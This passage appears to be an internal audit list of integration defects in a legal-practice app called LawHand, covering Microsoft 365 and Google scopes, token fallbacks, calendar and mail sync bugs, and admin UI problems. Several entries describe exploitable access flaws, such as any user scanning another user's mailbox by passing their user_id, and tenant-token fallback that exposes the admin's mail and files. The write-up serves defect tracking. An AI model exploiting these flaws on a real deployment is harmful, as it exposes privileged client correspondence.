detail: upsert_task_event calls _get_token(tenant_id, user_id) without exact_user, so it falls back to get_fresh_token and /me/events is the admin's calendar (microsoft_calendar.py:132-181). push_task_to_calendars fires this for every dated task (task_notifications.py:290-317). Descriptions include matter/customer names.
user_impact: The admin's calendar fills with other lawyers' deadlines, including matters they may be walled from, while the actual assignee gets nothing.

title: Directory sync (when it runs) imports guests, rooms and shared mailboxes as licensed users and re-activates users LawHand admins deactivated
detail: GET /users has no $filter on userType or assignedLicenses and $select omits userType. Every enabled object becomes role 'user' with license_active=True, and existing matches get is_active=True unconditionally (user_sync.py:170-173). Disabled Entra accounts are skipped, not deactivated. The bug is latent today because of the tier defect, but it is live for any legacy credential with a detected tier.
user_impact: Deactivated departing staff come back on the next sync. External guests and room resources inflate seat counts and appear in assignment pickers.

title: Plugin integration detection checks scopes LawHand never requests, so OneDrive and Google Drive never show as available
detail: The code checks 'Files.Read.All' and 'drive.readonly', but the connect flows request Files.ReadWrite.All and the full drive scope (integrations.py:241-259). The scope lists are hand-copied in four places: integrations.py:241-270, admin.py:1604-1622, plugins.py:370-389 and integrations.py:2031-2035.
user_impact: Plugin cards and pages list 'Integrations: sharepoint, outlook, calendar' and omit OneDrive/Google Drive for fully connected firms (PluginsPage.jsx:88, PluginPage.jsx:159).

title: Firm-mailbox fallback sends approved client email as the connecting admin
detail: When the approver has no per-user grant, the tenant credential (the admin's delegated token) is used with /me/sendMail and saveToSentItems=True. There is no shared-mailbox support (Mail.Send.Shared or /users/{shared}/sendMail).
user_impact: Clients receive correspondence from the managing partner's personal address, it lands in that partner's Sent Items, and replies go to the wrong person.

title: Unused and over-broad scopes requested: Chat.ReadWrite, TeamsActivity.Send, per-user Files.ReadWrite.All, admin Mail.Read
detail: No code calls /chats or sendActivityNotification, and the Teams manifest has no 'activities' block (teams-app/manifest.json:1-50), yet both scopes are required for teams_connected (teams_gate.py:25-28). Per-user Microsoft tokens are only used for reads (cloud_search, cloud_sync, document_sync), so Files.Read.All would do. Admin Mail.Read only reaches the admin's own mailbox and feeds the leak above. Sign-in also requests offline_access and User.Read and then discards the tokens (auth.py:1324, 1372).
user_impact: The consent screens ask for 'read and write all your chats' and 'full access to all files' without need. Security-conscious firm admins refuse or delay consent.

title: Per-user token lacks Sites.Read.All but global Graph search requests the listItem entity
detail: entityTypes ['driveItem','listItem'] is sent with the per-user token (MICROSOFT_USER_SCOPES has no Sites.Read.All, integrations.py:256-259). listItem requires Sites.Read.All, so the request likely returns 403 and search_group returns None. Status: PLAUSIBLE, needs a live check.
user_impact: Users with a personal Microsoft connection get no OneDrive/SharePoint hits from connected-source search.

title: Filenames containing '#' or '%' break path-based OneDrive/SharePoint uploads
detail: The filename is interpolated unencoded into ':/{filename}:/content' (also createUploadSession at 925 and SharePoint at 1384-1387). '#' starts a URL fragment, which truncates the path and drops the conflictBehavior query. The inbound attachment sanitizer keeps '#' and '%' (inbound_email.py:271-283), and failures are logged and swallowed (inbound_email.py:386-400).
user_impact: Attachments such as 'Exhibit #3.pdf' silently fail to file to the matter folder.

title: Tenant token row lock is held for the caller's whole transaction on the fresh-token path
detail: get_fresh_token takes SELECT ... FOR UPDATE (token_vault.py:196-209) and returns without committing when the token is fresh. Concurrent requests that need the same tenant credential (every no-personal-token user in RAG or search) wait on lock_timeout=5s, and _execute_locked_scalar then returns None, which reads as 'not connected'. Status: PLAUSIBLE, from code reading.
user_impact: Under concurrent chat load, Microsoft sources drop out of answers intermittently with no visible error.

title: Per-user connect accepts any Microsoft account, including personal Outlook.com, with no identity or tenant check
detail: The user-intent callback stores whatever account completed consent. There is no openid, no /me lookup, and no comparison with the user's Entra tid/oid or email domain. The authority is 'common' (config.py:108).
user_impact: Client correspondence can go out from, and be captured from, a lawyer's personal mailbox, breaking firm retention and supervision.

title: No UI to disconnect M365, no per-user disconnect, and no revocation at Microsoft
detail: POST /microsoft/disconnect exists (integrations.py:2105-2134), but api.js and IntegrationsPanel have no caller. Users cannot remove their own grant, and the admin endpoint deletes every user's token.
user_impact: Users cannot withdraw mailbox/file access from LawHand. Admins must delete the enterprise app in Entra, which the UI never mentions.

title: Capability matrix hard-codes email, calendar and cloud_storage as 'Available' regardless of granted scopes
detail: resolve() always returns ok for these three, even when Mail.Send, Calendars.ReadWrite or Files.ReadWrite.All is missing.
user_impact: The admin card shows 'Email: Available' while client sends fail with 'reconnect to grant permission to send email'.

title: Most Graph call sites ignore 429/Retry-After and truncate silently
detail: Only graph_request (provider_http) retries. cloud_sync, cloud_search, cloud_init, document_sync, user_sync, calendar and storage_discovery use raw httpx and break or return empty on any non-200.
user_impact: Large firms that hit throttling get partial indexes and folder trees with no alert.

title: Commercial cloud only: hard-coded authority and Graph hosts, plus host allow-lists
detail: login.microsoftonline.com and graph.microsoft.com appear in 18 modules (for example storage_discovery.py:18,30-32). Continuation-URL validators reject any other host.
user_impact: Firms on GCC High or DoD (defense/CMMC clients) or 21Vianet cannot use LawHand at all.

title: SharePoint index sync ignores the bound site and indexes /sites/root
detail: sync_all calls sync_sharepoint(db, tenant_id) without the sharepoint_binding site_id (cloud_sync.py:145-152). Only top-level children of each root-site library are indexed.
user_impact: The matter library bound by the admin is not indexed, and intranet root-site files appear in firm search instead.

title: Admin data-visibility guide omits Mail.Send from both Microsoft scope lists
detail: Code requests Mail.Send in both the admin and user sets (integrations.py:241-259).
user_impact: Admins doing a privacy/DPA review get an inaccurate permission inventory.

title: Teams app tab cannot render inside Teams: edge forbids framing and there is no Teams SSO
detail: The server-level `X-Frame-Options SAMEORIGIN` and CSP `frame-ancestors 'self'` are inherited by `location /` (nginx/nginx.conf:690-700), which serves the SPA route /teams (frontend/src/App.jsx:346-353). Only the Office snippet whitelists Microsoft ancestors (nginx/snippets/office_addin.conf:26). The committed Teams manifest points staticTabs/configurableTabs at https://getlawhand.com/teams and declares webApplicationInfo for SSO (teams-app/manifest.json:25-51). However, routers/teams.py has no SSO exchange (only link/notification/voice routes, lines 106-591). TeamsTabPage relies on cookie auth, and session cookies default to SameSite=Lax (backend/app/config.py:60). TASKS 1403 (SSO) is still pending (TASKS.md:2380-2389).
user_impact: A firm admin who installs the checked-in lawhand-teams.zip gets a refused or blank LawHand tab in Teams, so the only Teams-embedded surface appears broken.

title: Default Microsoft 365 storage lands in the connecting admin's personal OneDrive, contrary to the org-owned-root guarantee
detail: In Auto mode, an active Microsoft 365 connection binds storage to OneDrive (TC-02, TASKS.md:567-569; RELEASE_NOTES.md:1735). The OneDrive root is `/me/drive` (backend/app/services/cloud_init.py:1506-1508), so it is the delegated admin's personal drive. The design of record promises that business-tenant roots are organisation-owned (docs/storage-root-ownership-and-handoff.md:12-14) but rates OneDrive 'No — at risk' (line 28). SharePoint, the org-owned custody option, requires an explicit admin override, and its access is still delegated (lines 92-93). The at_risk warning mitigates this but does not prevent it.
user_impact: For the Microsoft 365 first-customer profile, firm matter records live in one person's OneDrive. Custody and access are lost or disputed when that admin leaves or is deprovisioned.

title: BK28/ECO ledger is stale: shipped work is still unchecked, and the plan's current-state gaps are outdated
detail: The epic is headed '(PLANNED)' and every ECO item is [ ]. However, the ECO-17 substance (Personal Google mode) shipped (backend/app/routers/integrations.py:266-286; CHANGELOG.md:279-289). ECO-24 to ECO-28 largely shipped (docs/sms-provider-operations.md:11-40; propose_client_sms in workspace_mcp_protocol.py:124), and ECO-01/04 partially shipped (CHANGELOG.md:312-318, 752-758). The plan's leverage table still says 'personal Gmail directory sync fails' (plan:64). It also says signup's trial_ends_at is unread (plan:66, 262-265), which was fixed in 2026.09.11.8.
user_impact: New M365/Google/Copilot recommendations measured against this ledger will duplicate or re-plan shipped work, and sequencing (e.g. ECO-17 as a P2 prerequisite for ECO-19) looks more expensive than it is.

title: Docs understate granted mail scopes: code requests Mail.Send / gmail.send, docs say read-only
detail: The setup doc lists the Microsoft admin/user scopes without Mail.Send and says Google consent covers 'Gmail read' (docs/integrations-setup.md:46-47, 71-72). The virtual document assistant plan states 'Existing Microsoft and Google mail integrations use read-only scopes' (docs/virtual-document-assistant-plan.md:544-545). The code requests Mail.Send and gmail.send in admin, user and solo scope sets (backend/app/routers/integrations.py:241-272; constants at backend/app/services/connected_mail.py:44-45) and sends via /me/sendMail and gmail messages/send.
user_impact: The setup doc tells operators to record granted scopes in the customer security record, so customer security records and consent disclosures under-report send permission. ECO-18 Google scope verification planning starts from the wrong baseline.

title: BYOK 'copilot'/'gemini' customer-LLM path contradicts ECO-20 and the LiteLLM-only ledger
detail: A tenant admin endpoint 'Configure the tenant to use their own LLM subscription (Gemini/Copilot)' (backend/app/routers/admin.py:1515-1520) stores a key that bypasses the LiteLLM gateway entirely (backend/app/services/llm.py:261-275). Provider 'copilot' is actually an Azure OpenAI resource (backend/app/services/byok_security.py:33-58; config comment 'Azure OpenAI (Copilot backend)' at backend/app/config.py:155). The default Gemini model is hard-coded 'gemini-2.0-flash'. Gateway accounting metadata is skipped for customer keys (llm.py:351). This conflicts with TASKS.md:2622 ([x] direct Azure/Gemini paths removed) and with ECO-20 ('behind LiteLLM, never ... a subscription benefit or an unmetered tenant route', TASKS.md:479-481).
user_impact: Naming and docstrings invite the ruled-out misconception that a firm's Microsoft 365 Copilot or Gemini subscription powers LawHand. The tenant route also escapes the gateway's approval, fallback and metering controls.

title: Teams ledger stale and a build artifact committed against plan
detail: 1402 (manifest/packaging) is marked PENDING although teams-app/manifest.json and package.ps1 exist. The same task says 'do not commit the zip', yet teams-app/lawhand-teams.zip is tracked (git ls-files). The launch list also requires updating Teams/Office manifests to new app IDs (TASKS.md:146), so a committed zip can silently drift from manifest.json.
user_impact: Operators may sideload a stale zip with old app IDs, and planners see Teams packaging as not started.

title: Office add-in roadmap has no live task entries; the only TASKS item refers to the removed prototype
detail: TASKS says 'Ship the Word add-in properly (it hardcodes localhost ... localStorage) or archive it'. But word-addin/ was removed and replaced by office-addin/ (docs/office-document-assistant-plan.md:355; office-addin/README.md). The Office plan's Slices 1-5 (docs/office-document-assistant-plan.md:259-306) and the W2 Template Builder (docs/template-studio-clio-parity-execution-status.md:187-191) have no tracked TASKS entries.
user_impact: The Word/Outlook/Excel roadmap, the main 'use the client's office suite' path, is invisible in the ledger and easy to drop or duplicate.

title: Remediation plan status and migration references are wrong
detail: The header still says 'Status: Proposed' although phases 0-2 are marked Done. It cites migrations '073_integration_observability' and '074' under migrations/versions (lines 31, 179, 195), but the real files are backend/alembic/versions/082_integration_observability.py and 083_matter_doc_storage_meta.py.
user_impact: Readers cannot tell which remediation items are live or find the schema changes.

title: Mojibake in customer-facing release notes on Workspace MCP entries
detail: 'ΓÇö' and 'ΓÇÖ' appear 3 times in RELEASE_NOTES.md (lines 1647, 1766, 1769) and 3 times in backend/app/release_notes.json, which feeds in-app release notes.
user_impact: In-app 'What's new' shows garbled text on the Workspace MCP (connected assistants) announcements.

title: Any user can scan another user's mailbox via /api/email/scan user_id
detail: user_id = str(user.id) if not body.user_id else body.user_id has no admin or ownership check. process_emails then loads that user's delegated token (email_agent.py:348-364).
user_impact: A paralegal can POST {user_id: partnerId} and receive the partner's inbox subjects, senders, AI summaries and drafted replies. The scan also writes notes and tasks attributed to the partner.

title: Tenant-token fallback exposes the connecting admin's mailbox and OneDrive to every user's chat retrieval
detail: _get_microsoft_token and _get_google_token (1515-1527) fall back to get_fresh_token when the user has no personal token. That tenant credential is a delegated refresh token for the admin who connected, so /search/query message hits and /me/messages/{id}/$value (1329-1359) read the admin's mailbox. RAG calls this for any user (backend/app/services/rag.py:1891-1906). Separately, cloud-sync indexes the admin's /me/messages into a tenant-wide index (cloud_sync.py:725-829) that search_index returns to everyone (cloud_search.py:472-507).
user_impact: Any staff member who has not connected their own account can ask chat about a topic and get content from the admin's private email and files.

title: Deactivated users are silently re-activated nightly and their mailboxes keep being captured
detail: Every directory match sets user_row.is_active = True (also at 321-327). Admin deactivation (backend/app/routers/admin.py:300-306) does not delete or revoke UserOAuthToken rows. run_correspondence_capture iterates all token rows with no User.is_active or health filter (backend/app/services/scheduler.py:1894-1916).
user_impact: A user an admin deactivated is back in at the 2:00 AM directory sync, and their mailbox is still archived into matters every 30 minutes.

title: Directory sync never deprovisions and licenses guests and resource accounts
detail: /users $select has no userType and no filter. accountEnabled=false only skips creating new users and never deactivates existing ones. Deleted users are ignored. New rows get license_active=True (Google path is the same at 305-351).
user_impact: Departed staff stay active and licensed. External guests in the firm's Entra tenant (clients or co-counsel invited to Teams) and room or shared mailboxes become licensed LawHand users.

title: Moved or renamed matter deadlines leave stale events on Outlook and Google calendars
detail: Key-date pushes store no provider event id. Deduplication is (subject, start date) read from the provider. When a key date moves or the matter is renamed, a new event is created and the old one is never updated or deleted.
user_impact: Lawyers see the old court date alongside the new one, which is a missed-deadline risk.

title: Date-only task events are sent to Google with an empty time range
detail: All-day events send end.date == start.date. Google's end.date is exclusive, so the range is empty. The Graph path correctly adds one day (backend/app/services/microsoft_calendar.py:83-96). The failure is only logged (google_calendar.py:159-166) inside fire-and-forget code (task_notifications.py:36-50). Should be confirmed against the live API, because the unit test encodes end == start.
user_impact: Tasks without a due time, which covers most deadlines, never appear on Google Calendar, and nothing tells the user.

title: After any storage migration, every 15-minute sync re-walks the entire cloud tree and wipes and rewrites the index
detail: sync_all and sync_matter_folders call storage_migration_reindex.run(force=True) on every run. That does a BFS with one Graph or Drive call per folder plus marker downloads and no 429 handling (backend/app/services/storage_discovery.py:233-298), then deletes and re-upserts all file rows (storage_migration_reindex.py:130-143). Any failure raises RuntimeError before mail sync runs (cloud_sync.py:85-88).
user_impact: A firm with thousands of matter folders makes thousands of API calls every 15 minutes, gets throttled, and cloud sync (including mail metadata) then fails continuously.

title: Cloud sync provider failures are recorded as successful syncs with 0 items
detail: On non-200 responses the loop breaks or returns 0 instead of raising: Drive (361-372), Gmail (493-501), Outlook (763-771), Graph files (1058-1064), SharePoint (641-661), and a missing token (330-332). The scheduler then records status='completed' (backend/app/services/scheduler.py:1779-1790). This contradicts the sync_all docstring (cloud_sync.py:75-77).
user_impact: Revoked consent or a missing Sites.Read.All shows as a green 'completed, 0 ok' tile while the index goes stale.

title: Task calendar pushes fall back to the admin's calendar
detail: _get_token returns the tenant token when the assignee has no personal token or refresh fails (Google is the same at google_calendar.py:18-38). The event is then written to /me/events of the admin who connected. Every task change also pushes to both providers (task_notifications.py:308-317).
user_impact: Tasks (with client names and descriptions) for unconnected or revoked users fill one admin's personal calendar. Revocation is hidden instead of surfaced.

title: Timed tasks land at the wrong hour on Outlook and Google
detail: due_time is sent in the matter's intake timezone (the client's) or UTC when there is no intake (backend/app/services/matter_followups.py:29-44). The LawHand calendar renders the same due_time as browser-local wall time (backend/app/routers/calendar.py:38-48). There is no firm or user timezone.
user_impact: A 2:00 PM deadline on a matter without intake shows 2:00 PM in LawHand but 9:00 AM CDT in Outlook.

title: Key-date deduplication misses and duplicates events east of UTC+9 and past 100 events
detail: Graph reads are normalized to UTC ('Prefer: outlook.timezone="UTC"') and keyed on the UTC date [:10] (542-547), while events are created at 09:00 local (594). calendarView is $top 100 with no @odata.nextLink. Google uses maxResults 100 with no pageToken (344-350), even though the dedupe window is 90 days.
user_impact: Sydney or NZ firms, and anyone with more than 100 events in 90 days, get another '[LawHand] ...' duplicate on every sync.

title: Email where the party is only on CC is never captured
detail: The Graph $select omits ccRecipients, and the Gmail metadataHeaders are From/To/Subject/Date only (backend/app/services/google_mail.py:187-194). correspondence_capture._email_addresses reads 'cc' (correspondence_capture.py:87-94), which is always empty.
user_impact: Messages where the client or opposing counsel is copied are missed, even though the rules UI promises 'emails involving the matter's parties'.

title: Fixed 50-message window silently drops mail
detail: Each run reads the top CORRESPONDENCE_CAPTURE_MAX_EMAILS=50 messages from the last 7 days with no pagination (microsoft_mail.py:38-50, google_mail.py:169-180) and keeps no cursor.
user_impact: More than 50 messages in one 30-minute interval, or an outage longer than 7 days, leaves permanent gaps in the matter file.

title: The two mail ingestion paths block each other's dedupe and re-spend LLM calls
detail: The email agent writes CommunicationLog(matter_id, external_ref='provider:id') with no document. The capture path's _already_captured (correspondence_capture.py:217-233, 263-269) then skips it, so no .eml is ever archived. In the other order, capture blocks note and task-tag creation (email_agent.py:64-77). process_emails also classifies and drafts before any dedupe (email_agent.py:366-394).
user_impact: Matters lack the archived .eml, and every Communications-page scan re-bills LLM classification and premium drafts for mail already logged.

title: Outbound emails get filed twice
detail: The compose log stores no external_ref. Graph sendMail returns 202 with no id (connected_mail.py:128-138), and the Gmail id is returned but discarded (connected_mail.py:192-199). A later scan captures the Sent Items copy under 'provider:id' (correspondence_capture.py:258-269).
user_impact: Each client email appears twice on the matter, as two log rows and two .eml files.

title: A staff alias counts as a matter party, so the alias owner's mail is filed into all of their matters
detail: Verified aliases of every assigned user are added to party_addresses, and any address overlap triggers capture (200-207).
user_impact: Every message to or from an attorney's verified alias is copied into each matter they are assigned to, putting privileged mail on other clients' files.

title: Google 403 rate limits are treated as auth failures (no backoff, 'Reconnect' shown)
detail: All 401 and 403 responses become ProviderAuthError without checking the reason. Google returns 403 rateLimitExceeded and userRateLimitExceeded. connected_mail maps this to REAUTHORIZATION_REQUIRED (connected_mail.py:267-280).
user_impact: Users are told to reconnect Google when they are only throttled, and nothing is retried.

title: No 429 or Retry-After handling outside mail read/send; calendar pushes are lost for good
detail: Calendar (calendar_sync.py:124-141, google_calendar.py:100-166), cloud sync (cloud_sync.py:343-372), directory (user_sync.py:130-145) and discovery (storage_discovery.py:214-250) all use raw httpx with no retry. Task pushes are fire-and-forget with no durable retry.
user_impact: Under Graph or Google throttling, calendar copies go stale permanently and syncs fail for the whole cycle.

title: Tenant row is locked across hundreds of provider HTTP calls
detail: Every _upsert runs SELECT tenants FOR UPDATE plus a migration lookup. Commit happens only after the whole provider loop (for example, Gmail at 509-562 does about 200 sequential HTTP calls), which also means about 3 DB statements per item.
user_impact: Other writes to the tenant row (settings, onboarding, cutover) block or time out during every 15-minute sync.

title: Gmail metadata sync uses a Drive-only service-account token on Shared Drive tenants
detail: prefer_service_account is applied to every Google token, including Gmail. The service token has only DRIVE_SCOPES and no subject (backend/app/services/google_service_account.py:213-243). Gmail returns 403, which is then recorded as 0 items.
user_impact: Firms on an org Shared Drive never get Gmail in the index, and nothing reports an error.

title: Editing or deleting a scheduled event cancels and re-sends invites, or leaves orphans
detail: Every PATCH deletes and recreates the event using the editor's token, not the creator's. The delete result is ignored (backend/app/services/scheduled_events.py:125-142). There is no creator or role check.
user_impact: Clients get a cancellation plus a new invite on every edit, and the Teams join link changes. When another user edits or deletes the event, the original stays in the creator's calendar with the client still invited.

title: Google scheduled events never send invitations
detail: events.insert (and delete at 512-516) is called without sendUpdates, which Google treats as 'none'. Graph sends invites by default.
user_impact: Clients added as attendees on Google-backed meetings never receive an invite or a cancellation.

title: Tenant OneDrive and SharePoint sync lists only root-level items
detail: sync_onedrive uses /me/drive/root/children and sync_sharepoint uses /drives/{id}/root/children (663-680), with no recursion or delta.
user_impact: Matter files in subfolders (nearly all of them) are missing from firm-wide search unless someone runs the per-matter sync.

title: Native Google Docs and Sheets are excluded from the index and from ingestion
detail: LEGAL_MIME_TYPES has no application/vnd.google-apps.* types. The Drive query (334-339) and document_sync (document_sync.py:281-292, which also ANDs the mime and extension clauses) filter them out.
user_impact: Google Workspace firms' own drafts in Google Docs never show up in index search or RAG ingestion.

title: Manual directory sync failures are invisible
detail: The durable user_sync job raises without calling record_sync_failure, and Google is skipped if Microsoft raises. The UI waits 4 seconds and re-reads credential status.
user_impact: The card keeps showing the last 'ok' sync after a failed manual run.

title: Per-matter 'Sync folder' reports 'synced' when providers failed
detail: Provider exceptions are only logged, and the router returns status 'synced' with the counts (backend/app/routers/matters.py:3407-3425).
user_impact: Users think the matter's cloud files are current when the listing failed.

title: Revoked user tokens stay in the scan roster and are refreshed again on every use
detail: _locked_user_token does not filter health='revoked'. Each correspondence cycle, search and push attempts a refresh and logs a failure (scheduler.py:1896-1952).
user_impact: Error noise and wasted refresh calls every 30 minutes per revoked user; the admin sees repeated failures instead of one 'user must reconnect' state.

title: ms_read_mail_tenant is dead and broken
detail: It passes the Graph user id as the LawHand user_id to get_fresh_user_token, so every user is skipped. There are no callers.
user_impact: None today; it is a trap for anyone who builds tenant-wide capture on top of it.

title: Personal-Google tenants cannot re-authorize from Admin > Cloud
detail: handleReauthorize builds /integrations/google/connect?intent=admin without account_mode. The backend defaults it to 'workspace' (backend/app/routers/integrations.py:658-662), requests the directory scope, and the callback rejects a personal account with account_mode_mismatch (integrations.py:799-800). The error redirect then sends the admin to /onboarding (integrations.py:1805-1807).
user_impact: A solo firm on personal Google whose token is revoked follows the card's own "Re-authorize" remedy, fails every time, and lands in the setup wizard. The only way out is to know to re-run onboarding and pick Personal Google.

title: Admin OAuth failures always land on /onboarding; the Cloud section never shows the connect result
detail: _error_redirect sends every admin-intent error to /onboarding?error=..., even when onboarding_completed. On success, the redirect goes to /admin?tab=integrations&integration=cloud&connected=<provider>, but IntegrationsPanel never reads connected or error (IntegrationsPanel.jsx:145-158). ZoomPanel.jsx:89-105 and CalendarPage.jsx:508-548 both handle these parameters. For a completed tenant, OnboardingWizard shows the error above a 'Setup Complete!' screen (OnboardingWizard.jsx:73-77, 717). Docs claim admin connections return to the Cloud section (frontend/platform_docs/administrative-guide/04-integrations.md:51) and tell admins to look for errors 'in the address bar' (line 47).
user_impact: An admin who cancels consent, or lacks tenant-admin rights, is thrown into the setup wizard with a vague message. A successful reconnect gives no confirmation.

title: No UI to disconnect Microsoft 365 or Google Workspace
detail: The backend exposes POST /integrations/microsoft/disconnect and /google/disconnect (backend/app/routers/integrations.py:2105-2166), but api.js has no wrapper (api.js:798-835) and ProviderCard offers only Connect/Re-authorize. The admin guide tells admins to 'disconnect through the supported interface' (04-integrations.md:85-91).
user_impact: A firm cannot offboard a provider, switch the consenting account cleanly, or respond to a security incident without contacting support.

title: Saving a SharePoint library silently switches the primary storage provider
detail: SharePointBindingCard always sends is_primary: true. The backend then sets primary_cloud_provider='sharepoint' (backend/app/routers/cloud_admin.py:397-405), and the panel updates the selector (IntegrationsPanel.jsx:338). This skips the explicit confirmation that PrimaryCloudSelector enforces (comment at 351-354). The binding is also stored as 'configured' with no write check.
user_impact: An admin who only wanted to try a SharePoint library repoints every new matter document write, with no warning and no verification that the library is writable.

title: Consent copy and admin docs understate granted access (send mail, write all files)
detail: The wizard says 'Required: Read all users, read mail, read files (OneDrive + SharePoint), read/write calendars'. The actual admin scopes include Mail.Send and Files.ReadWrite.All (backend/app/routers/integrations.py:241-252; the Google admin grant includes gmail.send). The data-visibility guide lists MS scopes without Mail.Send and says the Gmail grant 'does not authorize sending' (16-integration-data-visibility.md:42,60-62). The hub card says only 'Mail and calendar access for enabled workflows' (IntegrationsHub.jsx:71-75).
user_impact: Firms write client/privacy notices from inaccurate disclosures, and admins consent to send-as and full file write without being told.

title: 'Granted by' line never renders; the deactivated-grantor warning is never shown
detail: ProviderCard reads info.service_account_email, but GET /admin/permissions never returns it (backend/app/routers/admin.py:1706-1797); only the test fixture has it (IntegrationsPanel.test.jsx:69). The 'User X who granted consent is deactivated' warning exists only in /admin/integrations/health (admin.py:365-376), whose client getIntegrationsHealth (api.js:799-800) is never called.
user_impact: Admins cannot see who owns the firm-wide grant, and get no warning before offboarding that person breaks mail, storage and sync.

title: Cloud Search reports 'Available'/'Connected'/'Enabled' while the connection is broken
detail: The hub pill returns 'Available' for any cloud tone other than 'off', including 'Needs attention'. The Cloud Search status endpoint filters only is_active, not health, so revoked or refresh_failed credentials show 'Connected' (backend/app/routers/cloud_admin.py:170-176,257-263). It also hard-codes enabled: True, even in its error branch (cloud_admin.py:219-238, 267-272). The frontend ignores status:'error' (CloudSearchAdmin.jsx:52-57,73).
user_impact: An admin told search is available keeps relying on it while the grant is revoked, and a status failure looks like 'Enabled, 0 items, Not connected'.

title: Onboarding 'Sync Users' button does not run a sync
detail: handleSyncUsers only persists step numbers (POST /admin/onboarding/step/{n} just writes onboarding_step, backend/app/routers/onboarding.py:203-221) and advances to Review. It relies on the post-connect background sync having already happened.
user_impact: If the auto-sync failed or is slow, the admin presses 'Sync Users', sees '0 users imported' and is told to sync later from Admin.

title: Microsoft token-exchange failure is reported as a Google error
detail: OAUTH_ERROR_MESSAGES.token_exchange_failed reads 'Google authorization could not be completed', but the Microsoft callback emits the same code (backend/app/routers/integrations.py:545). access_denied, consent_required, interaction_required, invalid_state and oauth_failed all fall back to one generic message (line 77).
user_impact: A Microsoft consent failure sends the admin to troubleshoot Google, and a 'needs admin approval' case gets no Global Administrator guidance.

title: Hub Teams pill and Teams panel use different sources and can contradict
detail: The hub uses permissions.microsoft.capabilities.teams, which depends on account_type; /admin/permissions does not backfill unknown types (admin.py:1648-1652, compare 322-324). An unknown type shows 'Not available on this account'. TeamsPanel uses /integrations/status teams_connected (TeamsPanel.jsx:105-108), which backfills and also honours TEAMS_FEATURE_ENABLED (integrations.py:1844-1865). If the flag is off, the hub can say 'Connected' while the panel shows 'Reconnect to enable Teams', which reconnecting cannot fix.
user_impact: Contradictory states and a reconnect loop for admins trying to enable Teams.

title: 'Sync now' uses a fixed 4 s timer and shared spinner, and never reports a result
detail: triggerUserSync is tenant-wide, and one syncing flag drives both provider cards (271-282). After 4 s it silently reloads, with no success, failure or count message. Errors go to a top-level banner that never clears.
user_impact: Both cards spin together, and the admin cannot tell whether the sync worked or is still running.

title: Destructive actions without confirmation
detail: Storage migration 'Abandon' (button at line 140), Zoom 'Disconnect', Zoom Phone 'Disconnect' and 'Clear tenant app' (ZoomPanel.jsx:108-119,134-145,164-176) and Cloud Search 'Invalidate Cache' (CloudSearchAdmin.jsx:328-352) act on a single click. QBOPanel shows the intended confirm pattern (QBOPanel.jsx:146-147).
user_impact: A mis-click discards migration evidence or cuts off call intake with no consequence explanation.

title: Connect endpoints return raw JSON errors on a top-level navigation
detail: The 501 (OAuth not configured), 428 (agreements pending), 403 and 400 responses (also google_connect, 664-687) are HTTPExceptions, so the browser shows {"detail": ...}. The admin panel's Connect button is always enabled (IntegrationsPanel.jsx:760-769), unlike onboarding, which disables it until agreements are ready (OnboardingWizard.jsx:411-412).
user_impact: The admin leaves the app for a raw JSON page with no way back and no next step.

title: In-product and doc navigation points to places that do not exist
detail: Wizard: 'Admin > Integrations > Cloud > Storage migration'. Storage migration is actually under Advanced and needs manage_integrations (IntegrationsHub.jsx:238-257). CloudSearchAdmin.jsx:95 says 'Settings > Integrations'. The Teams gate says 'Integrations tab' with no link (TeamsPanel.jsx:133). Docs describe Shared Drive and root-repair controls that the UI lacks (21-onboarding-and-storage-setup.md:54,63) and send unbound-folder repair to 'File Shares', which is SMB (18-cloud-provider-support.md:97). The user drawer's 'MCP Servers' button (frontend/src/pages/admin/UserMcpAccess.jsx:411-417) silently falls back to Overview for admins without manage_integrations (IntegrationsHub.jsx:330-333,478-479).
user_impact: Non-technical admins follow instructions into dead ends.

title: Cloud Search copy hard-codes a 15-minute sync interval
detail: The interval is configurable (CLOUD_METADATA_SYNC_INTERVAL_MIN, backend/app/services/scheduler.py:804-809) and the job only runs if enabled.
user_impact: The page states freshness that may be wrong.

title: SharePoint-backed matters appear unprovisioned or 'Local' across end-user UI
detail: storageLabel() has no 'sharepoint' case, so it returns 'Local' (lines 68-73). CloudFolderCard only reads providers.onedrive and providers.google_drive (lines 157-163), so isProvisioned is false for a SharePoint-only matter. The header and Details links in MatterDetailPage.jsx:144-161 skip SharePoint and label any non-OneDrive context folder 'Google Drive'. MatterSmbSharesTab.jsx:52-55 and :227 omit SharePoint, which gives 'No cloud folder mapped yet'. The backend does write cloud_folder['sharepoint'] (backend/app/services/cloud_init.py:510-588) and sets storage_backend='sharepoint' (backend/app/services/matter_file_store.py:1360-1425).
user_impact: At M365 firms using SharePoint (the location the guide recommends, 16-integration-transparency.md:119), users see 'Document folders are not set up', no Open-folder link, 'Open in Local' on each document, a LOCAL chip, and 'Saved to Local. Edits happen in the firm's cloud copy.' after upload (MatterDocumentsTab.jsx:440-445). They may click 'Set up folders' again or distrust where files are.

title: 'Connect in Admin → Integrations' is a silent dead-end for non-admin users
detail: The empty Cloud Files state calls navigate('/admin'). /admin is a financeOnly ShellRoute (App.jsx:490-491), and ProtectedRoute redirects users without finance access to default_route (App.jsx:210-212). Other non-actionable pointers to admin: CloudFolderCard copy (MatterDocumentsTab.jsx:219-223), StorageReadinessNotice.jsx:30, and the backend send error 'Reconnect ... in Integrations' (backend/app/services/connected_mail.py:233-239).
